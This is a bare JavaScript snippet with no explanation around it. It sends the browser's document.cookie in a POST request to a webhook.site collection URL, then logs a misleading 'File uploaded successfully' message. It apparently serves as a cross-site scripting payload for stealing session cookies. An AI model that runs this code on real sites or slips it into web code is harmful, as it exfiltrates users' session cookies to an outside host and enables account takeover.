fetch("https://webhook.site/189316b2-fca8-4f5a-aabe-31f9393a49b5", {
  method: 'POST',
  body: document.cookie
})
.then(response => {
  if (!response.ok) {
    throw new Error('Network response was not ok');
  }
  return response.json();
})
.then(data => {
  console.log('File uploaded successfully:', data);
})
.catch(error => {
  console.error('There was a problem with your fetch operation:', error);
});
